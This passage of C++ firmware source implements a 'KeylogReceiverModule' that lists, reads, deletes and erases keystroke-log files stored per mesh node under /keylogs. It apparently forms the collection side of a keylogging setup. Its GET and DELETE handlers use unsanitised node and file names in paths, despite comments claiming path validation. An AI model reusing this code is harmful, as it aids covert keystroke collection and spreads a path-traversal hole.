 * NASA Rule 2: Fixed directory scan bounds
 */
size_t KeylogReceiverModule::handleListCommand(char *response, size_t maxLen)
{
    // NASA Rule 4: Validate input
    assert(response != nullptr);

    // Start JSON array
    size_t offset = 0;
    offset += snprintf(response + offset, maxLen - offset, "{\"status\":\"ok\",\"nodes\":[");

    // Scan /keylogs directory for node subdirectories
    File dir = FSCom.open(KEYLOG_BASE_DIR);
    if (!dir || !dir.isDirectory()) {
        snprintf(response, maxLen, "{\"status\":\"error\",\"message\":\"Failed to open keylogs directory\"}");
        return strlen(response);
    }

    bool firstNode = true;
    uint32_t nodeCount = 0;

    // NASA Rule 2: Fixed upper bound on directory scan (max 100 nodes)
    for (uint32_t i = 0; i < 100; i++) {
        File entry = dir.openNextFile();
        if (!entry) {
            break;  // No more entries
        }

        if (entry.isDirectory()) {
            // Get node ID from directory name
            const char *nodeIdStr = entry.name();

            // Add node to JSON
            if (!firstNode) {
                offset += snprintf(response + offset, maxLen - offset, ",");
            }
            offset += snprintf(response + offset, maxLen - offset,
                             "{\"nodeId\":\"%s\",\"files\":[", nodeIdStr);

            // Scan files in node directory
            bool firstFile = true;
            File nodeDir = entry;

            // NASA Rule 2: Fixed upper bound on file scan (max 100 files per node)
            for (uint32_t j = 0; j < 100; j++) {
                File fileEntry = nodeDir.openNextFile();
                if (!fileEntry) {
                    break;
                }

                if (!fileEntry.isDirectory()) {
                    if (!firstFile) {
                        offset += snprintf(response + offset, maxLen - offset, ",");
                    }
                    offset += snprintf(response + offset, maxLen - offset,
                                     "{\"name\":\"%s\",\"size\":%lu}",
                                     fileEntry.name(), (unsigned long)fileEntry.size());
                    firstFile = false;
                }
                fileEntry.close();

                // Check buffer space
                if (offset >= maxLen - 100) {
                    LOG_WARN("[KeylogReceiver] LIST response truncated (buffer full)");
                    break;
                }
            }

            offset += snprintf(response + offset, maxLen - offset, "]}");
            firstNode = false;
            nodeCount++;
        }
        entry.close();

        // Check buffer space
        if (offset >= maxLen - 100) {
            LOG_WARN("[KeylogReceiver] LIST response truncated (buffer full)");
            break;
        }
    }

    dir.close();

    offset += snprintf(response + offset, maxLen - offset, "],\"nodeCount\":%lu}", (unsigned long)nodeCount);
    return offset;
}

/**
 * @brief Handle KEYLOG:GET command - get file content
 * NASA Rule 6: File size validation
 */
size_t KeylogReceiverModule::handleGetCommand(const char *nodeId, const char *filename,
                                              char *response, size_t maxLen)
{
    // NASA Rule 4: Validate inputs
    assert(nodeId != nullptr);
    assert(filename != nullptr);
    assert(response != nullptr);

    // Build file path
    char path[KEYLOG_MAX_PATH_LEN];
    int pathLen = snprintf(path, sizeof(path), "%s/%s/%s", KEYLOG_BASE_DIR, nodeId, filename);
    if (pathLen < 0 || pathLen >= (int)sizeof(path)) {
        snprintf(response, maxLen, "Error: Path too long");
        return strlen(response);
    }

    // Open file
    File f = FSCom.open(path, "r");
    if (!f) {
        snprintf(response, maxLen, "Error: File not found: %s", path);
        return strlen(response);
    }

    // Check file size
    size_t fileSize = f.size();
    if (fileSize == 0) {
        f.close();
        snprintf(response, maxLen, "Error: File is empty");
        return strlen(response);
    }

    // Read file content (up to maxLen-1 for null terminator)
    size_t readLen = (fileSize < maxLen - 1) ? fileSize : maxLen - 1;
    size_t bytesRead = f.read((uint8_t *)response, readLen);
    f.close();

    if (bytesRead != readLen) {
        snprintf(response, maxLen, "Error: File read failed");
        return strlen(response);
    }

    response[bytesRead] = '\0';  // Null terminate

    LOG_INFO("[KeylogReceiver] GET %s/%s (%lu bytes)", nodeId, filename, (unsigned long)bytesRead);
    return bytesRead;
}

/**
 * @brief Handle KEYLOG:DELETE command - delete file
 * NASA Rule 6: Path validation
 */
size_t KeylogReceiverModule::handleDeleteCommand(const char *nodeId, const char *filename,
                                                 char *response, size_t maxLen)
{
    // NASA Rule 4: Validate inputs
    assert(nodeId != nullptr);
    assert(filename != nullptr);
    assert(response != nullptr);

    // Build file path
    char path[KEYLOG_MAX_PATH_LEN];
    int pathLen = snprintf(path, sizeof(path), "%s/%s/%s", KEYLOG_BASE_DIR, nodeId, filename);
    if (pathLen < 0 || pathLen >= (int)sizeof(path)) {
        snprintf(response, maxLen, "Error: Path too long");
        return strlen(response);
    }

    // Delete file
    if (!FSCom.remove(path)) {
        snprintf(response, maxLen, "Error: Failed to delete %s", path);
        return strlen(response);
    }

    LOG_INFO("[KeylogReceiver] Deleted %s", path);
    snprintf(response, maxLen, "Success: Deleted %s", filename);
    return strlen(response);
}

/**
 * @brief Handle KEYLOG:STATS command - filesystem statistics
 * NASA Rule 2: Fixed directory scan bounds
 */
size_t KeylogReceiverModule::handleStatsCommand(char *response, size_t maxLen)
{
    // NASA Rule 4: Validate input
    assert(response != nullptr);

    uint32_t totalFiles = 0;
    uint32_t totalBytes = 0;
    uint32_t nodeCount = 0;

    // Scan /keylogs directory
    File dir = FSCom.open(KEYLOG_BASE_DIR);
    if (!dir || !dir.isDirectory()) {
        snprintf(response, maxLen, "{\"status\":\"error\",\"message\":\"Failed to open keylogs directory\"}");
        return strlen(response);
    }

    // NASA Rule 2: Fixed upper bound (max 100 nodes)
    for (uint32_t i = 0; i < 100; i++) {
        File entry = dir.openNextFile();
        if (!entry) {
            break;
        }

        if (entry.isDirectory()) {
            nodeCount++;
            File nodeDir = entry;

            // NASA Rule 2: Fixed upper bound (max 100 files per node)
            for (uint32_t j = 0; j < 100; j++) {
                File fileEntry = nodeDir.openNextFile();
                if (!fileEntry) {
                    break;
                }

                if (!fileEntry.isDirectory()) {
                    totalFiles++;
                    totalBytes += fileEntry.size();
                }
                fileEntry.close();
            }
        }
        entry.close();
    }

    dir.close();

    // Build JSON response
    size_t offset = snprintf(response, maxLen,
                            "{\"status\":\"ok\",\"totalFiles\":%lu,\"totalBytes\":%lu,\"nodeCount\":%lu}",
                            (unsigned long)totalFiles, (unsigned long)totalBytes, (unsigned long)nodeCount);
    return offset;
}

/**
 * @brief Handle KEYLOG:ERASE_ALL command - delete all files
 * NASA Rule 2: Fixed directory scan bounds
 */
size_t KeylogReceiverModule::handleEraseAllCommand(char *response, size_t maxLen)
{
    // NASA Rule 4: Validate input
    assert(response != nullptr);

    uint32_t filesDeleted = 0;
    uint32_t nodesDeleted = 0;

    // Scan /keylogs directory
    File dir = FSCom.open(KEYLOG_BASE_DIR);
    if (!dir || !dir.isDirectory()) {
        snprintf(response, maxLen, "Error: Failed to open keylogs directory");
        return strlen(response);
    }

    // NASA Rule 2: Fixed upper bound (max 100 nodes)
    for (uint32_t i = 0; i < 100; i++) {
        File entry = dir.openNextFile();
        if (!entry) {
            break;
        }

        if (entry.isDirectory()) {
            const char *nodeIdStr = entry.name();
            File nodeDir = entry;

            // Delete all files in node directory
            // NASA Rule 2: Fixed upper bound (max 100 files per node)
            for (uint32_t j = 0; j < 100; j++) {
                File fileEntry = nodeDir.openNextFile();
                if (!fileEntry) {
                    break;
                }

                if (!fileEntry.isDirectory()) {
                    char filePath[KEYLOG_MAX_PATH_LEN];
                    snprintf(filePath, sizeof(filePath), "%s/%s/%s",
                            KEYLOG_BASE_DIR, nodeIdStr, fileEntry.name());
                    fileEntry.close();

                    if (FSCom.remove(filePath)) {
                        filesDeleted++;
                    }
                } else {
                    fileEntry.close();
                }
            }

            // Delete node directory
            char nodePath[KEYLOG_MAX_PATH_LEN];
            snprintf(nodePath, sizeof(nodePath), "%s/%s", KEYLOG_BASE_DIR, nodeIdStr);
            entry.close();

            if (FSCom.rmdir(nodePath)) {
                nodesDeleted++;
            }
        } else {
            entry.close();
        }
    }

    dir.close();

    LOG_INFO("[KeylogReceiver] Erased %lu files from %lu nodes",
             (unsigned long)filesDeleted, (unsigned long)nodesDeleted);

    snprintf(response, maxLen, "Success: Deleted %lu files from %lu nodes",
            (unsigned long)filesDeleted, (unsigned long)nodesDeleted);
    return strlen(response);
}

#endif /* KEYLOG_RECEIVER_ENABLED */
